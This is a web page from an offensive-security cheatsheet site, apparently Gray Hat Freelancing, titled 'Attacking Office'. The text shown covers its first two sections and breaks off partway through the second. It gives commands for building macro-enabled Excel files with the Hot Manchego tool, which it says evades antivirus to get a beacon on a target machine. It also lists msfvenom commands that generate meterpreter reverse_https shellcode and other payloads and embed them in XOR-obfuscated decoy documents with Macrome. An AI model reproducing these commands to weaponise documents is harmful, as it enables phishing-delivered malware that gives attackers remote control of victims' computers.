<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="A quick reference and/or cheatsheet for attacking Microsoft Office."><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content="Attacking Office"><meta property="og:description" content="A quick reference and/or cheatsheet for attacking Microsoft Office."><meta property="og:type" content="article"><meta property="og:url" content="https://www.grayhatfreelancing.com/docs/office_attacks/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2022-11-03T00:00:00+00:00"><meta property="article:modified_time" content="2022-12-10T11:35:25-05:00"><title>Attacking Office | Gray Hat Freelancing</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css integrity="sha256-SzX+0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt+5t7EDugY=" crossorigin=anonymous><script defer src=/flexsearch.min.js></script>
<script defer src=/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2+lMiccGbo=" crossorigin=anonymous></script>
<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5VH24CV5RY",{anonymize_ip:!1})}</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[o]=e[o]||function(){(e[o].a=e[o].a||[]).push(arguments)},e[o].l=1*new Date;for(var r=0;r<document.scripts.length;r++)if(document.scripts[r].src===s)return;i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym"),ym(90832071,"init",{clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!0})</script><noscript><div><img src=https://mc.yandex.ru/watch/90832071 style=position:absolute;left:-9999px alt></div></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894" crossorigin=anonymous></script>
<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce=JP_uCP3IebkCUXDh6KjRmw></script><script nonce=JP_uCP3IebkCUXDh6KjRmw>(function(){function e(){if(!window.frames.googlefcPresent)if(document.body){const e=document.createElement("iframe");e.style="width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;",e.style.display="none",e.name="googlefcPresent",document.body.appendChild(e)}else setTimeout(e,0)}e()})()</script>
<script>(function(){"use strict";if(V=function(e){var t=0;return function(){return t<e.length?{done:!1,value:e[t++]}:{done:!0}}},P="function"==typeof Object.create?Object.create:function(e){var t=function(){};return t.prototype=e,new t},"function"==typeof Object.setPrototypeOf)g=Object.setPrototypeOf;else{a:{N={a:!0},O={};try{O.__proto__=N,k=O.a;break a}catch{}k=!1}g=k?function(e,t){if(e.__proto__=t,e.__proto__!==t)throw new TypeError(e+" is not extensible");return e}:null}var F=g,w=function(e,t){if(e.prototype=P(t.prototype),e.prototype.constructor=e,F)F(e,t);else for(n in t)if("prototype"!=n)if(Object.defineProperties){var n,s=Object.getOwnPropertyDescriptor(t,n);s&&Object.defineProperty(e,n,s)}else e[n]=t[n];e.v=t.prototype},e=this||self,Z=function(){},M=function(e){return e},m=function(e,t){this.g=t===S?e:""};m.prototype.toString=function(){return this.g+""},S={},E=function(t){if(void 0===h){var n=null,s=e.trustedTypes;if(s&&s.createPolicy){try{n=s.createPolicy("goog#html",{createHTML:M,createScript:M,createScriptURL:M})}catch(t){e.console&&e.console.error(t.message)}h=n}else h=n}return t=(n=h)?n.createScriptURL(t):t,new m(t,S)},x=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)},C={},r=null,b="function"==typeof Uint8Array;function T(e,t,n){return"object"==typeof e?b&&!Array.isArray(e)&&e instanceof Uint8Array?n(e):D(e,t,n):t(e)}function D(e,t,n){if(Array.isArray(e)){for(var a,o=Array(e.length),s=0;s<e.length;s++)a=e[s],a!=null&&(o[s]=T(a,t,n));return Array.isArray(e)&&e.s&&i(o),o}o={};for(s in e)Object.prototype.hasOwnProperty.call(e,s)&&(a=e[s],a!=null&&(o[s]=T(a,t,n)));return o}function ee(e){return D(e,function(e){return"number"==typeof e?isFinite(e)?e:String(e):e},function(e){if(void 0===n&&(n=0),!r){r={};for(var t,n,s,o,l,d,a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),c=["+/=","+/","-_=","-_.","-_"],i=0;5>i;i++){t=a.concat(c[i].split("")),C[i]=t;for(s=0;s<t.length;s++)o=t[s],void 0===r[o]&&(r[o]=s)}}n=C[n],a=Array(Math.floor(e.length/3)),c=n[64]||"";for(i=t=0;t<e.length-2;t+=3)l=e[t],d=e[t+1],o=e[t+2],s=n[l>>2],l=n[(l&3)<<4|d>>4],d=n[(d&15)<<2|o>>6],o=n[o&63],a[i++]=""+s+l+d+o;switch(s=0,o=c,e.length-t){case 2:s=e[t+1],o=n[(s&15)<<2]||c;case 1:e=e[t],a[i]=""+n[e>>2]+n[(e&3)<<4|s>>4]+o+c}return a.join("")})}var $={s:{value:!0,configurable:!0}},i=function(e){return Array.isArray(e)&&!Object.isFrozen(e)&&Object.defineProperties(e,$),e},o=function(e,t,n){var s=p;p=null,e||(e=s),s=this.constructor.u,e||(e=s?[s]:[]),this.j=s?0:-1,this.h=null,this.g=e;a:{if(s=this.g.length,e=s-1,s&&(s=this.g[e],!(null===s||"object"!=typeof s||Array.isArray(s)||b&&s instanceof Uint8Array))){this.l=e-this.j,this.i=s;break a}void 0!==t&&-1<t?(this.l=Math.max(t,e+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(n)for(t=0;t<n.length;t++)e=n[t],e<this.l?(e+=this.j,(s=this.g[e])?i(s):this.g[e]=f):(s=this.l+this.j,this.g[s]||(this.i=this.g[s]={}),(s=this.i[e])?i(s):this.i[e]=f)},f=Object.freeze(i([])),t=function(e,t){if(-1===t)return null;if(t<e.l){t+=e.j;var n=e.g[t];return n!==f?n:e.g[t]=i([])}if(e.i)return n=e.i[t],n!==f?n:e.i[t]=i([])},z=function(e,n){var s,o=L;return-1===n?null:(e.h||(e.h={}),e.h[n]||(s=t(e,n),s&&(e.h[n]=new o(s))),e.h[n])};o.prototype.toJSON=function(){var e=l(this,!1);return ee(e)},l=function(e,t){if(e.h)for(o in e.h)if(Object.prototype.hasOwnProperty.call(e.h,o)){var s,o,n=e.h[o];if(Array.isArray(n))for(s=0;s<n.length;s++)n[s]&&l(n[s],t);else n&&l(n,t)}return e.g},j=function(e,t){return p=t=t?JSON.parse(t):null,e=new e(t),p=null,e},o.prototype.toString=function(){return l(this,!1).toString()},A=function(e){o.call(this,e)},w(A,o);function Q(e){var t,s=(e.ownerDocument&&e.ownerDocument.defaultView||window).document,n=null===(t=s.querySelector)||void 0===t?void 0:t.call(s,"script[nonce]");(t=n?n.nonce||n.getAttribute("nonce")||"":"")&&e.setAttribute("nonce",t)}u=function(e,t){return t=String(t),"application/xhtml+xml"===e.contentType&&(t=t.toLowerCase()),e.createElement(t)},d=function(t){this.g=t||e.document||document},d.prototype.appendChild=function(e,t){e.appendChild(t)};var r,l,d,u,h,p,g,b,j,y,_,O,x,C,E,k,A,S,N,P,V,v=function(e,t,n,s,o,i){try{var r=e.g,a=u(e.g,"SCRIPT");a.async=!0,a.src=t instanceof m&&t.constructor===m?t.g:"type_error:TrustedResourceUrl",Q(a),r.head.appendChild(a),a.addEventListener("load",function(){o(),s&&r.head.removeChild(a)}),a.addEventListener("error",function(){0<n?v(e,t,n-1,s,o,i):(s&&r.head.removeChild(a),i())})}catch{i()}},X=e.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),K=e.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),U=e.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),W=function(e,t,n){this.h=e,this.j=new d(this.h),this.g=null,this.i=[],this.l=!1,this.o=t,this.m=n},I=function(t){if(t.h.body&&!t.l){var n=function(){B(t),e.setTimeout(function(){return R(t,3)},50)};v(t.j,t.o,2,!0,function(){e[t.m]||n()},n),t.l=!0}},B=function(e){for(var i,r,c,l,t=n(1,5),o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i);t=s(e),t.style.bottom="0",t.style.left="0",t.style.position="fixed",t.style.width=n(100,110).toString()+"%",t.style.zIndex=n(2147483544,2147483644).toString(),t.style["background-color"]=H(249,259,242,252,219,229),t.style["box-shadow"]="0 0 12px #888",t.style.color=H(0,10,0,10,0,10),t.style.display="flex",t.style["justify-content"]="center",t.style["font-family"]="Roboto, Arial",o=s(e),o.style.width=n(80,85).toString()+"%",o.style.maxWidth=n(750,775).toString()+"px",o.style.margin="24px",o.style.display="flex",o.style["align-items"]="flex-start",o.style["justify-content"]="center",i=u(e.j.g,"IMG"),i.className=x(),i.src=X,i.style.height="24px",i.style.width="24px",i.style["padding-right"]="16px",r=s(e),c=s(e),c.style["font-weight"]="bold",c.textContent=K,l=s(e),l.textContent=U,a(e,r,c),a(e,r,l),a(e,o,i),a(e,o,r),a(e,t,o),e.g=t,e.h.body.appendChild(e.g),t=n(1,5);for(o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i)},a=function(e,t,o){for(var r,i=n(1,5),a=0;a<i;a++)r=s(e),t.appendChild(r);t.appendChild(o),o=n(1,5);for(i=0;i<o;i++)a=s(e),t.appendChild(a)},n=function(e,t){return Math.floor(e+Math.random()*(t-e))},H=function(e,t,s,o,i,a){return"rgb("+n(Math.max(e,0),Math.min(t,255)).toString()+","+n(Math.max(s,0),Math.min(o,255)).toString()+","+n(Math.max(i,0),Math.min(a,255)).toString()+")"},s=function(e){return e=u(e.j.g,"DIV"),e.className=x(),e},R=function(t,n){0>=n||null!=t.g&&0!=t.g.offsetHeight&&0!=t.g.offsetWidth||(q(t),B(t),e.setTimeout(function(){return R(t,n-1)},50))},q=function(e){var t=e.i,n="undefined"!=typeof Symbol&&Symbol.iterator&&t[Symbol.iterator],t=n?n.call(t):{next:V(t)};for(n=t.next();!n.done;n=t.next())(n=n.value)&&n.parentNode&&n.parentNode.removeChild(n);e.i=[],(t=e.g)&&t.parentNode&&t.parentNode.removeChild(t),e.g=null},Y=function(t,n,s,o,i){var a=G(s),c=function(s){s.appendChild(a),e.setTimeout(function(){a?(0!==a.offsetHeight&&0!==a.offsetWidth?n():t(),a.parentNode&&a.parentNode.removeChild(a)):t()},o)},r=function(t){document.body?c(document.body):0<t?e.setTimeout(function(){r(t-1)},i):n()};r(3)},G=function(e){var t=document.createElement("div");return t.className=e,t.style.width="1px",t.style.height="1px",t.style.position="absolute",t.style.left="-10000px",t.style.top="-10000px",t.style.zIndex="-10000",t},L=function(e){o.call(this,e)};w(L,o),_=function(e){o.call(this,e)},w(_,o),y=function(e,n){this.l=e,this.m=new d(e.document),this.g=n,this.i=t(this.g,1),n=z(this.g,2),this.o=E(t(n,4)||""),this.h=!1,n=z(this.g,13),n=E(t(n,4)||""),this.j=new W(e.document,n,t(this.g,12))},y.prototype.start=function(){J(this)};var J=function(n){te(n),v(n.m,n.o,3,!1,function(){a:{var i,s=n.i,o=e.btoa(s);if(o=e[o]){try{i=j(A,e.atob(o))}catch{s=!1;break a}s=s===t(i,1)}else s=!1}s?c(n,t(n.g,14)):(c(n,t(n.g,8)),I(n.j))},function(){Y(function(){c(n,t(n.g,7)),I(n.j)},function(){return c(n,t(n.g,6))},t(n.g,9),t(n.g,10),t(n.g,11))})},c=function(e,t){e.h||(e.h=!0,e=new e.l.XMLHttpRequest,e.open("GET",t,!0),e.send())},te=function(n){var s=e.btoa(n.i);n.l[s]&&c(n,t(n.g,5))};(function(t,n){e[t]=function(){for(var i=[],o=0;o<arguments.length;++o)i[o-0]=arguments[o];e[t]=Z,n.apply(null,i)}})("__h82AlnkH6D91__",function(e){"function"==typeof window.atob&&new y(window,j(_,window.atob(e))).start()})}).call(this),window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hWWTQzNTA3UlV4MlBicWdSRGsxQnFnWnV6Rm5xU3hmTDZsRVcyVDRvSVhTa2QzRlZvQlpra0RHTlRvYmU1dTM5U3k4bFVROGJsNVpxQjlxWGh6Z3FuT1JBXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFY1V0czR01DdDNLNmVxTDlKQ2NFNnJwU0oxNDVZTjlXOS1SU2tFd3J3NXhMbEROSU1rdVVCcnI2QjJyY3Zia0w0dGNMOEFCV0ZFUy1idzBNWG8zcUdyTUFcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFhfdzJlbk9UVmhhN05TeVAxakR2SkJyMU1MbDhvS0Zpb0N1bm0wVWxFMEdqUGVtVUM1RFpLajFTWGxBYktHUWZWa1lvNWs0RlIzbXdvdktROVA2cWE4cmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFdNTi1PNHpRLUJENU1wakZVNWVjUVdqeGIwNHh5Yzc3akdlOEdwbjZ5VWtiemF3SkxYV3lfQ2xMWWFORVEtWER0cXJ4R1JQMzBpbjNBUnJZTXR2NHlXMWdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VnlVcTVpZThXX0JkWFlGNXo3MzhtQjBkMEcxeEFlZ1BPZHp3WGVDdFdvQW5xVVNvWndVdW00UFhMRXNpUEZ1b2oxUUFUN25WNl9XWDdjMEE1X3VacFd2UVx1MDAzZFx1MDAzZCJd")</script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Gray Hat Freelancing</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=/docs/kuburnetes/>Kuburnetes</a></li><li><a href=/docs/checking_for_account_takeover/>Account Takeovers</a></li><li><a href=/docs/attacking_active_directory/>Active Directory Attacks</a></li><li><a href=/docs/amazon_aws_s3_buckets/>Amazon AWS S3 Buckets</a></li><li><a href=/docs/api_key_leaks/>API Key Leaks</a></li><li><a href=/docs/argument_injection/>Argument Injection</a></li><li><a href=/docs/command_injection/>Command Injection</a></li><li><a href=/docs/cors_misconfigurations/>CORS Misconfigurations</a></li><li><a href=/docs/csrf_injection/>CSRF Injection</a></li><li><a href=/docs/directory_traversal/>Directory Traversal</a></li><li><a href=/docs/network_discovery/>Network Discovery</a></li><li><a href=/docs/insecure_deserialization/python/>Python Deserialization</a></li><li><a href=/docs/insecure_deserialization/ruby/>Ruby Deserialization</a></li><li><a href=/docs/web_sockets/>Web Sockets Attacks</a></li><li><a href=/docs/insecure_deserialization/yaml/>YAML Deserialization</a></li><li><a href=/docs/insecure_deserialization/dotnet/>.NET Insecure Deserialization</a></li><li><a href=/docs/exercism_solutions/>Exercism Solutions</a></li><li><a href=/docs/insecure_deserialization/>Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/node/>Node Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/php/>PHP Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/java/>Insecure Deserialization - Java</a></li><li><a href=/docs/cobalt_strike_all_you_need/>Cobalt Strike</a></li><li><a href=/docs/brute_force_cracking/>Brute Force Cracking</a></li><li><a href=/docs/training_grounds/>Training Grounds</a></li><li><a href=/docs/wordpress/>Wordpress Security</a></li><li><a href=/docs/windows_hardening/>Windows - Hardening</a></li><li><a href=/docs/windows_amsi_bypass/>Bypassing AMSI protections</a></li><li><a href=/docs/subdomains_enumeration/>Enumerating Subdomains</a></li><li><a href=/docs/windows_mimikatz/>Windows - Mimikatz</a></li><li><a href=/docs/windows_persistence/>Windows - Persistence</a></li><li><a href=/docs/windows_privilege_escalation/>Windows - Privilege Escalation</a></li><li><a href=/docs/windows_using_credentials/>Windows - Using Credentials</a></li><li><a href=/docs/windows_download_and_execute/>Windows Download and Execute Methods</a></li><li><a href=/docs/escape_breakout/>Application Escape and Breakout</a></li><li><a href=/docs/office_attacks/ class=active>Attacking Office</a></li><li><a href=/docs/bind_shell_cheatsheet/>Bind Shell Cheatsheet</a></li><li><a href=/docs/methodology_and_enumeration/>Bug Hunting Methodology and Enumeration</a></li><li><a href=/docs/hash_cracking/>Hash Cracking Cheatsheet</a></li><li><a href=/docs/linux_persistence/>Linux - Persistence</a></li><li><a href=/docs/linux_privilege_escalation/>Linux - Privilege Escalation</a></li><li><a href=/docs/metasploit_cheatsheet/>Metasploit</a></li><li><a href=/docs/windows_dpapi/>Microsoft Window's Data Protection API</a></li><li><a href=/docs/microsoft_azure_cloud/>Microsoft's Azure Cloud</a></li><li><a href=/docs/network_pivoting_techniques/>Network Pivoting Cheatsheet</a></li><li><a href=/docs/mssql_server_cheatsheet/>Pentesting MSSQL Server Cheatsheet</a></li><li><a href=/docs/powershell_cheatsheet/>Powershell Cheatsheet</a></li><li><a href=/docs/reverse_shell_cheatsheet/>Reverse Shell Cheatsheet</a></li><li><a href=/docs/source_code_management/>Source Code Management</a></li><li><a href=/docs/docker_pentesting/>Docker Security</a></li><li><a href=/docs/miscellaneous_tricks/>Miscellaneous Tips and Tricks</a></li><li><a href=/docs/csv_injection/>Csv Injection</a></li><li><a href=/docs/crlf_injection/>CRLF Injection</a></li><li><a href=/docs/cve_exploits/>CVE Exploits</a></li><li><a href=/docs/dependency_confusion_attacks/>Dependency Confusion</a></li><li><a href=/docs/dns_rebinding/>DNS Rebinding</a></li><li><a href=/docs/file_inclusion/>File Inclusion</a></li><li><a href=/docs/http_parameter_pollution/>HTTP Parameter Pollution</a></li><li><a href=/docs/insecure_direct_object_references/>Insecure Direct Object References</a></li><li><a href=/docs/insecure_file_uploads/>Insecure File Upload</a></li><li><a href=/docs/insecure_management_interfaces/>Insecure Management Interface</a></li><li><a href=/docs/insecure_source_code_management/>Insecure Source Code Management</a></li><li><a href=/docs/java_rmi/>Java RMI</a></li><li><a href=/docs/json_web_token/>JSON Web Tokens</a></li><li><a href=/docs/latex_injection/>LaTeX Injection</a></li><li><a href=/docs/ldap_injection/>LDAP Injection</a></li><li><a href=/docs/nosql_injection/>NoSQL Injection</a></li><li><a href=/docs/oauth/>OAuth</a></li><li><a href=/docs/open_url_redirection/>Open URL Redirection</a></li><li><a href=/docs/race_conditions/>Race Conditions</a></li><li><a href=/docs/request_smuggling/>Request Smuggling</a></li><li><a href=/docs/saml_injection/>SAML Injection</a></li><li><a href=/docs/server_side_request_forgery/>Server-Side Request Forgery</a></li><li><a href=/docs/server_side_template_injection/>Server-Side Template Injection</a></li><li><a href=/docs/sql_injection/>SQL Injection</a></li><li><a href=/docs/tabnabbing/>Tabnabbing</a></li><li><a href=/docs/type_juggling/>Type Juggling</a></li><li><a href=/docs/web_cache_deception/>Web Cache Deception</a></li><li><a href=/docs/xxe_injection/>XML eXternal Entity Injection</a></li><li><a href=/docs/xpath_injection/>XPATH Injection</a></li><li><a href=/docs/xslt_injection/>XSLT Injection</a></li><li><a href=/docs/xss_injection/>XSS Injection</a></li><li><a href=/docs/graphql_injection/>GraphQL Injection</a></li></ul><ul><li><a href=/posts/>Blog</a></li><li><a href=https://github.com/m00tiny/ target=_blank rel=noopener>Github</a></li><li><a href=https://github.com/m00tiny/grayhatfreelancing target=_blank rel=noopener>Contribute</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
<strong>Attacking Office</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#office---attacks>Office - Attacks</a><ul><li><a href=#xlsm---hot-manchego>XLSM - Hot Manchego</a></li><li><a href=#xlm---macrome>XLM - Macrome</a></li><li><a href=#xlm-excel-40---sharpshooter>XLM Excel 4.0 - SharpShooter</a></li><li><a href=#xlm-excel-40---excelntdonut>XLM Excel 4.0 - EXCELntDonut</a></li><li><a href=#xlm-excel-40---exec>XLM Excel 4.0 - EXEC</a></li><li><a href=#docm---metasploit>DOCM - Metasploit</a></li><li><a href=#docm---download-and-execute>DOCM - Download and Execute</a></li><li><a href=#docm---macro-creator>DOCM - Macro Creator</a></li><li><a href=#docm---c-converted-to-office-vba-macro>DOCM - C# converted to Office VBA macro</a></li><li><a href=#docm---vba-wscript>DOCM - VBA Wscript</a></li><li><a href=#docm---vba-shell-execute-comment>DOCM - VBA Shell Execute Comment</a></li><li><a href=#docm---vba-spawning-via-svchostexe-using-scheduled-task>DOCM - VBA Spawning via svchost.exe using Scheduled Task</a></li><li><a href=#docm---wmi-com-functions>DOCM - WMI COM functions</a></li><li><a href=#docmxlm---macro-pack---macro-and-dde>DOCM/XLM - Macro Pack - Macro and DDE</a></li><li><a href=#docm---badassmacros>DOCM - BadAssMacros</a></li><li><a href=#docm---cactustorch-vba-module>DOCM - CACTUSTORCH VBA Module</a></li><li><a href=#docm---mmg-with-custom-dl--exec>DOCM - MMG with Custom DL + Exec</a></li><li><a href=#docm---activex-based-inkpicture-control-painted-event-autorun-macro>DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro</a></li><li><a href=#vba-obfuscation>VBA Obfuscation</a></li><li><a href=#vba-purging>VBA Purging</a><ul><li><a href=#officepurge>OfficePurge</a></li><li><a href=#evilclippy>EvilClippy</a></li></ul></li><li><a href=#vba---offensive-security-template>VBA - Offensive Security Template</a></li><li><a href=#vba---amsi>VBA - AMSI</a></li><li><a href=#docx---template-injection>DOCX - Template Injection</a><ul><li><a href=#remote-template>Remote Template</a></li><li><a href=#template-injections-tools>Template Injections Tools</a></li></ul></li><li><a href=#docx---dde>DOCX - DDE</a></li><li><a href=#slk---excel>SLK - Excel</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=office---attacks>Office - Attacks
<a class=anchor href=#office---attacks>#</a></h1><h2 id=xlsm---hot-manchego>XLSM - Hot Manchego
<a class=anchor href=#xlsm---hot-manchego>#</a></h2><blockquote><p>When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn&rsquo;t catch a simple lolbas payload to get a beacon on a target machine.</p></blockquote><ul><li><a href=https://github.com/FortyNorthSecurity/hot-manchego>https://github.com/FortyNorthSecurity/hot-manchego</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>Generate CS Macro and save it to Windows as vba.txt
</span></span><span style=display:flex><span>PS&gt; New-Item blank.xlsm
</span></span><span style=display:flex><span>PS&gt; C:\Windows\Microsoft.NET\Framework\v4.0.<span style=color:#ae81ff>30319</span>\csc.exe /reference<span style=color:#960050;background-color:#1e0010>:</span>EPPlus.dll hot-manchego.cs
</span></span><span style=display:flex><span>PS&gt; .\hot-manchego.exe .\blank.xlsm .\vba.txt
</span></span></code></pre></div><h2 id=xlm---macrome>XLM - Macrome
<a class=anchor href=#xlm---macrome>#</a></h2><blockquote><p>XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.</p></blockquote><ul><li><a href=https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip</a></li><li><a href=https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip</a></li><li><a href=https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span><span style=color:#75715e># NOTE: The payload cannot contains NULL bytes.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Default calc</span>
</span></span><span style=display:flex><span>msfvenom -a x86 -b <span style=color:#e6db74>&#39;\x00&#39;</span> --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed <span style=color:#f92672>-f</span> raw EXITFUNC=thread &gt; popcalc.bin
</span></span><span style=display:flex><span>msfvenom -a x64 -b <span style=color:#e6db74>&#39;\x00&#39;</span> --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor <span style=color:#f92672>-f</span> raw EXITFUNC=thread &gt; popcalc64.bin
</span></span><span style=display:flex><span><span style=color:#75715e># Custom shellcode</span>
</span></span><span style=display:flex><span>msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai <span style=color:#f92672>-f</span> raw -o shellcode-<span style=color:#ae81ff>86</span>.bin -b <span style=color:#e6db74>&#39;\x00&#39;</span>
</span></span><span style=display:flex><span>msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic <span style=color:#f92672>-f</span> raw -o shellcode-<span style=color:#ae81ff>64</span>.bin -b <span style=color:#e6db74>&#39;\x00&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># MSF shellcode</span>
</span></span><span style=display:flex><span>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<span style=color:#ae81ff>192.168</span>.1.59 LPORT=<span style=color:#ae81ff>443</span> -b <span style=color:#e6db74>&#39;\x00&#39;</span>  -a x64 --platform windows -e x64/xor_dynamic --platform windows <span style=color:#f92672>-f</span> raw -o msf64.bin
</span></span><span style=display:flex><span>msfvenom -p windows/meterpreter/reverse_https LHOST=<span style=color:#ae81ff>192.168</span>.1.59 LPORT=<span style=color:#ae81ff>443</span> -b <span style=color:#e6db74>&#39;\x00&#39;</span> -a x86 --encoder x86/shikata_ga_nai --platform windows <span style=color:#f92672>-f</span> raw -o msf86.bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin
</span></span><span style=display:flex><span>dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-<span style=color:#ae81ff>86</span>.bin --payload64-bit shellcode-<span style=color:#ae81ff>64</span>.bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># For VBA Macro</span>
</span></span><span style=display:flex><span>Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output<span style=color:#f92672>-file</span>-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
